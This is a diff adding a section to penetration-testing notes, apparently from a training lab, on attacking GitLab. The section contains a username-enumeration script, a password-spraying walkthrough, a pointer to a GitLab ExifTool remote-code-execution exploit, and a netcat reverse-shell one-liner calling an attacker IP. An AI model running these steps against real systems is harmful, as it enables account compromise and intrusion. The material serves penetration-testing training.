@@ -34,6 +34,10 @@ This document outlines common techniques for identifying and exploiting vulnerab
     - [Gitlab - Discovery & Enumeration](#gitlab---discovery--enumeration)
     - [Attacking Gitlab](#attacking-gitlab)
 
+  - [Common Gateway Interfaces](#common-gateway-interfaces)
+    - [Attacking Tomcat CGI](#attacking-tomcat-cgi)
+
+
 ---
 
 ## Overview
@@ -1468,3 +1472,113 @@ This behavior can be used to enumerate valid user accounts, which may later be t
 ---
 
 ### Attacking Gitlab
+
+GitLab exposes multiple attack paths that commonly revolve around **username enumeration**, **weak authentication**, and **version-specific vulnerabilities**. Since GitLab allows user enumeration by default, the first step is identifying valid accounts before attempting authentication attacks.
+
+GitLab exposes user profile pages at predictable paths:
+
+```
+/<username>
+```
+
+When requesting these paths, GitLab returns different HTTP status codes depending on whether the user exists. This behavior can be leveraged for **unauthenticated username enumeration**.
+
+The following Python script enumerates valid usernames by sending `HEAD` requests to potential profile URLs:
+
+```python
+#!/usr/bin/env python3
+
+import requests
+import argparse
+
+def main():
+    parser = argparse.ArgumentParser(description='GitLab User Enumeration')
+    parser.add_argument('--url', '-u', type=str, required=True, help='The URL of the GitLab\'s instance')
+    parser.add_argument('--wordlist', '-w', type=str, required=True, help='Path to the username wordlist')
+    parser.add_argument('-v', action='store_true', help='Enable verbose mode')
+    args = parser.parse_args()
+
+    print('GitLab User Enumeration in python')
+
+    with open(args.wordlist, 'r') as f:
+        for line in f:
+            username = line.strip()
+            if args.v:
+                print(f'Trying username {line[:-1]}...')
+            http_code = requests.head(f'{args.url}/{username}').status_code
+            if http_code == 200:
+                print(f'[+] The username {username} exists!')
+            elif http_code == 0:
+                print('[!] The target is unreachable.')
+                break
+
+if __name__ == '__main__':
+    main()
+```
+
+Run the script using a common username wordlist:
+
+```bash
+python3 user-enum.py --url http://gitlab.inlanefreight.local:8081/ -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+We discover two valid usernames:
+
+- `bob`
+- `root`
+
+![Filtered output](images/gitlab7.PNG)
+
+GitLab implements account lockout protections. In versions `16.6` and earlier, accounts are locked for 10 minutes after 10 failed login attempts by default. From version `16.6` onward, administrators can customize lockout thresholds via the admin UI.
+
+To avoid triggering lockouts, a **controlled password spraying** approach is used with common weak passwords:
+
+- `Password123`
+- `Welcome1`
+
+This results in successful authentication:
+
+```
+bob:Welcome1
+```
+
+![Filtered output](images/gitlab8.PNG)
+
+Earlier enumeration confirmed that the target is running **GitLab Community Edition** `13.10.2`. GitLab versions `13.10.2` and earlier are vulnerable to an authenticated remote code execution vulnerability related to unsafe handling of image metadata by `ExifTool`.
+
+This vulnerability allows an authenticated user to upload a specially crafted image that results in arbitrary command execution. Keep in mind, that this is an authenticated vulnerability. Valid credentials are required, which can be obtained via:
+
+- Weak passwords
+- OSINT
+- Password spraying
+- Self-registration (if enabled)
+
+The following exploit from **Exploit-DB** can be used:
+
+```
+https://www.exploit-db.com/exploits/49951
+```
+
+Using the exploit to trigger a reverse shell:
+
+```bash
+python3 gitlab-rce.py -t http://gitlab.inlanefreight.local:8081 -u bob -p Welcome1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.120 1337 >/tmp/f '
+```
+
+A listener is started on the attacker machine:
+
+```bash
+nc -lvnp 1337
+```
+
+The exploit successfully executes and results in a reverse shell on the GitLab host:
+
+![Filtered output](images/gitlab9.PNG)
+
+---
+
+## Common Gateway Interfaces
+
+---
+
+### Attacking Tomcat CGI
